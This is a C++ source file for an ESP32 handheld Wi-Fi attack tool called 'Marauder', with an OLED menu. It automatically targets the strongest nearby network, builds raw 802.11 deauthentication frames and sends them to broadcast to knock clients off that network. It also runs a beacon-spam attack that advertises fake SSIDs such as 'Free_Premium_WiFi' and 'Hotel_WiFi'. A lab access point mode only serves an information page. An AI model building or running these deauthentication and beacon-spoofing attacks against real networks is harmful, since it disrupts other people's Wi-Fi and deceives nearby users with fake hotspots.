#include <WiFi.h>
#include <WebServer.h>
#include <esp_wifi.h>
#include "globals.h"
#include "Marauderprototype.h"
#include "Bluetooth.h"

enum MARAUDERMODE {
  Marauder_MENU, 
  Deauth_Attack,
    Beacon_Attack,
    Lab_Access_Point
};

int selectMarauderOption = 0;
int totalMarauderOption = 2;

MARAUDERMODE currentMarauderMode = Marauder_MENU;

uint8_t targetBSSID[6];  
bool targetFound = false;
 
int targetChannel = -1;  

const char *LAB_AP_SSID = "MARAUDER_LAB";
WebServer labServer(80);
bool labAccessPointActive = false;
bool labServerRoutesRegistered = false;


void InitMarauder() {

  releaseBleMemoryForWifi();

  Serial.println("Resetting WiFi driver...");
  WiFi.disconnect(true);  // Disconnect and turn off WiFi
  delay(1000);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true);
  delay(1000);
  esp_wifi_set_promiscuous(false);
}


void enableMonitorMode() {
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_ctrl_filter(NULL);
}


void handleMarauderMode() {
    if (currentMarauderMode == Marauder_MENU) {
        displaymarauderMenu();
        handleMarauderInput();
        return;
    }

    if (currentMarauderMode == Lab_Access_Point) {
        handleLabAccessPoint();
        return;
    }

    enableMonitorMode();

    switch (currentMarauderMode) {
        case Deauth_Attack:
            Serial.println(" Deauth Attack Mode Activated ");
            deauthAttack(targetBSSID);
            break;
        case Beacon_Attack:
            Serial.println(" Beacon Attack Mode Activated ");
            sendBeaconAttack(targetBSSID);
            break;
        default:
            break;
    }

    esp_wifi_set_promiscuous(false);
    currentMarauderMode = Marauder_MENU;
}

void printBSSID(uint8_t *bssid) {
    for (int i = 0; i < 6; i++) {
        if (i > 0) Serial.print(":");
        Serial.print(bssid[i], HEX);
    }
    Serial.println();
}

void handleMarauderInput() { 
  static unsigned long lastButtonPress = 0; 

  if (readButton(BUTTON_UP) == LOW && millis() - lastButtonPress > 200) { 
    selectMarauderOption = (selectMarauderOption - 1 + totalMarauderOption) % totalMarauderOption;  
    lastButtonPress = millis();  
  }  
  else if (readButton(BUTTON_DOWN) == LOW && millis() - lastButtonPress > 200) { 
    selectMarauderOption = (selectMarauderOption + 1) % totalMarauderOption;  
    lastButtonPress = millis();  
  }  
  else if (readButton(BUTTON_SELECT) == LOW && millis() - lastButtonPress > 200) { 
    selectedMarauderOption();  
    lastButtonPress = millis();  
  }  
  else if (readButton(BUTTON_BACK) == LOW && millis() - lastButtonPress > 200) { 
    exitMarauderMode();  
    lastButtonPress = millis();  
  }  
}


void selectedMarauderOption() {
    Serial.print("Selected Option: ");
    Serial.println(selectMarauderOption);

    switch (selectMarauderOption) {
        case 0:
            currentMarauderMode = Deauth_Attack;
            break;
        case 1:
            currentMarauderMode = Beacon_Attack;
            break;
        case 2:
            currentMarauderMode = Lab_Access_Point;
            startLabAccessPoint();
            handleMarauderMode();
            return;
        default:
            Serial.println("Invalid option");
            return;
    }

    scanAndSetTarget();

    if (!targetFound) {
        Serial.println("No target found, aborting attack.");
        currentMarauderMode = Marauder_MENU;
        return;
    }

    handleMarauderMode();
}


void exitMarauderMode() {
    stopLabAccessPoint();
  esp_wifi_set_promiscuous(false);
  targetFound = false;
  marauderModeStarted = false; 
  WiFi.disconnect(true);
  WiFi.mode(WIFI_OFF);  
  currentMode = MENU;
}


void displaymarauderMenu() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_ncenB08_tr);  
    String menuOptions[] = {"Deauth", "Beacon", "Lab AP"};
  totalMarauderOption = sizeof(menuOptions) / sizeof(menuOptions[0]);

  for (int i = 0; i < totalMarauderOption; i++) {
    if (i == selectMarauderOption) {
      u8g2.setDrawColor(1);
      u8g2.drawBox(0, (i * 12) + 10, 128, 12); 
      u8g2.setDrawColor(0);
    } else {
      u8g2.setDrawColor(1);
    }

    u8g2.setCursor(5, (i * 12) + 20); 
    u8g2.print(menuOptions[i]);
  }

  u8g2.setDrawColor(1); 
  u8g2.sendBuffer();  
}

void startLabAccessPoint() {
    WiFi.mode(WIFI_AP);
    WiFi.softAPdisconnect(true);

    if (!WiFi.softAP(LAB_AP_SSID)) {
        Serial.println("Failed to start lab access point.");
        currentMarauderMode = Marauder_MENU;
        return;
    }

    if (!labServerRoutesRegistered) {
        labServer.on("/", HTTP_GET, []() {
            labServer.send(
                200,
                "text/html",
                "<!doctype html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'><title>Marauder Lab</title></head><body><h1>MARAUDER_LAB</h1><p>Educational test access point.</p><p>No credentials are requested or collected.</p></body></html>");
        });
        labServer.onNotFound([]() {
            labServer.send(404, "text/plain", "MARAUDER_LAB: page not found");
        });
        labServer.begin();
        labServerRoutesRegistered = true;
    }

    labAccessPointActive = true;
    Serial.print("Lab AP started: ");
    Serial.println(LAB_AP_SSID);
    Serial.print("Lab AP address: ");
    Serial.println(WiFi.softAPIP());

    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_ncenB08_tr);
    u8g2.drawStr(0, 10, "Lab AP active");
    u8g2.drawStr(0, 25, "MARAUDER_LAB");
    u8g2.drawStr(0, 40, "Info only");
    u8g2.drawStr(0, 55, "BACK to stop");
    u8g2.sendBuffer();
}

void handleLabAccessPoint() {
    if (!labAccessPointActive) {
        currentMarauderMode = Marauder_MENU;
        return;
    }

    labServer.handleClient();
    if (readButton(BUTTON_BACK) == LOW) {
        stopLabAccessPoint();
        currentMarauderMode = Marauder_MENU;
    }
}

void stopLabAccessPoint() {
    if (!labAccessPointActive) {
        return;
    }

    labServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    labAccessPointActive = false;
    Serial.println("Lab AP stopped.");
}

void scanAndSetTarget() {

    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true);
    delay(1000);

    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_ncenB08_tr);
    u8g2.drawStr(0, 10, "Scanning WiFi...");
    u8g2.sendBuffer();

    Serial.println("Scanning for WiFi...");
    int numNetworks = WiFi.scanNetworks();

    if (numNetworks <= 0) {
        Serial.print("Scan failed or no networks. Code: ");
        Serial.println(numNetworks);
        targetFound = false;

        u8g2.clearBuffer();
        u8g2.drawStr(0, 10, "Scan failed!");
        u8g2.drawStr(0, 25, "Try again.");
        u8g2.sendBuffer();
        delay(2000);
        return;
    }

    Serial.print("Found ");
    Serial.print(numNetworks);
    Serial.println(" networks.");

    u8g2.clearBuffer();
    u8g2.drawStr(0, 10, "Networks found:");
    char countStr[8];
    sprintf(countStr, "%d", numNetworks);
    u8g2.drawStr(0, 25, countStr);
    u8g2.sendBuffer();
    delay(1000);

    int bestSignal = -100;
    int bestIndex = -1;

    for (int i = 0; i < numNetworks; i++) {
        Serial.print("  ["); Serial.print(i); Serial.print("] ");
        Serial.print(WiFi.SSID(i));
        Serial.print(" RSSI: "); Serial.println(WiFi.RSSI(i));
        if (WiFi.RSSI(i) > bestSignal) {
            bestSignal = WiFi.RSSI(i);
            bestIndex = i;
        }
    }

    if (bestIndex != -1) {
        memcpy(targetBSSID, WiFi.BSSID(bestIndex), 6);
        targetChannel = WiFi.channel(bestIndex);

        Serial.print("Targeting WiFi: ");
        Serial.println(WiFi.SSID(bestIndex));

        Serial.print("MAC: ");
        String macStr = "";
        for (int i = 0; i < 6; i++) {
            macStr += String(targetBSSID[i], HEX);
            if (i < 5) macStr += ":";
        }
        Serial.println(macStr);

        Serial.print("Channel: ");
        Serial.println(targetChannel);

        targetFound = true;

        // Display result on OLED
        u8g2.clearBuffer();
        u8g2.drawStr(0, 10, "Target WiFi:");
        u8g2.drawStr(0, 25, WiFi.SSID(bestIndex).c_str());
        u8g2.drawStr(0, 40, "MAC:");
        u8g2.drawStr(0, 55, macStr.c_str());
        u8g2.sendBuffer();
        delay(3000);
    } else {
        Serial.println("Failed to select a valid WiFi network!");
        targetFound = false;

        u8g2.clearBuffer();
        u8g2.drawStr(0, 10, "Failed to select");
        u8g2.drawStr(0, 25, "valid network!");
        u8g2.sendBuffer();
        delay(2000);
    }

    // Free scan memory
    WiFi.scanDelete();
}



void deauthAttack(uint8_t *bssid) {
    Serial.println(" Enabling Monitor Mode...");

    esp_wifi_set_promiscuous(true);

    if (targetChannel > 0) {
        esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
        Serial.print("Tuned to channel: ");
        Serial.println(targetChannel);
    }

    uint8_t deauthPacket[26] = {
        0xC0, 0x00,
        0x3a, 0x01,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], 
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],  
        0x00, 0x00,
        0x07, 0x00  
    };

    size_t packet_size = sizeof(deauthPacket);

    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_ncenB08_tr);
    u8g2.drawStr(0, 10, "Deauth Attack");
    u8g2.drawStr(0, 25, "Sending packets...");
    u8g2.sendBuffer();

    int sent = 0;
    for (int i = 0; i < 100; i++) {
        esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, packet_size, true);
        if (result == ESP_OK) {
            sent++;
        } else {
            Serial.print(" Error: ");
            Serial.println(result);
        }
        delay(10);
    }

    Serial.print("Sent "); Serial.print(sent); Serial.println("/100 deauth packets.");
    esp_wifi_set_promiscuous(false);

    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_ncenB08_tr);
    u8g2.drawStr(0, 10, "Deauth Done!");
    char msg[24];
    sprintf(msg, "%d/100 sent", sent);
    u8g2.drawStr(0, 25, msg);
    u8g2.sendBuffer();
    delay(1500);
}


void createBeaconPacket(uint8_t *packet, const char *ssid) {
    memset(packet, 0, 128);  

    uint8_t beaconHeader[] = {
        0x80, 0x00,  
        0x00, 0x00,  
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  
        0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED,  
        0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED, 
        0x00, 0x00  
    };

    memcpy(packet, beaconHeader, sizeof(beaconHeader));

    int ssidLength = strlen(ssid);
    packet[37] = ssidLength; 
    memcpy(&packet[38], ssid, ssidLength);

    packet[38 + ssidLength] = 0x01; 
}

bool beaconAttackActive = false;

const char *fakeSSIDs[] = {
    "Hacked_Network",
    "Free_Premium_WiFi",
    "Hotel_WiFi",
    "Open_Hotspot"
};
const int numSSIDs = sizeof(fakeSSIDs) / sizeof(fakeSSIDs[0]);

void sendBeaconAttack(uint8_t *targetBSSID) {
    uint8_t beaconPacket[128];
    beaconAttackActive = true;

    esp_wifi_set_promiscuous(true);
    if (targetChannel > 0) {
        esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    }

    Serial.println(" Beacon spam started!");

    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_ncenB08_tr);
    u8g2.drawStr(0, 10, "Beacon Attack");
    u8g2.drawStr(0, 25, "Spamming SSIDs...");
    u8g2.sendBuffer();

    int ssidIndex = 0;

    while (beaconAttackActive) {
        createBeaconPacket(beaconPacket, fakeSSIDs[ssidIndex]);
        esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, sizeof(beaconPacket), true);
        Serial.print(" Sending Fake SSID: "); Serial.println(fakeSSIDs[ssidIndex]);

        u8g2.clearBuffer();
        u8g2.drawStr(0, 10, "Beacon Attack");
        u8g2.drawStr(0, 25, "Spamming SSID:");
        u8g2.drawStr(0, 40, fakeSSIDs[ssidIndex]);
        u8g2.sendBuffer();

        ssidIndex = (ssidIndex + 1) % numSSIDs;
        delay(100);

        if (readButton(BUTTON_BACK) == LOW) {
            beaconAttackActive = false;
            break;
        }
    }

    esp_wifi_set_promiscuous(false);
    Serial.println(" Beacon Attack Stopped.");

    u8g2.clearBuffer();
    u8g2.drawStr(0, 10, "Attack Stopped!");
    u8g2.drawStr(0, 25, "Back to menu...");
    u8g2.sendBuffer();
    delay(1500);
}


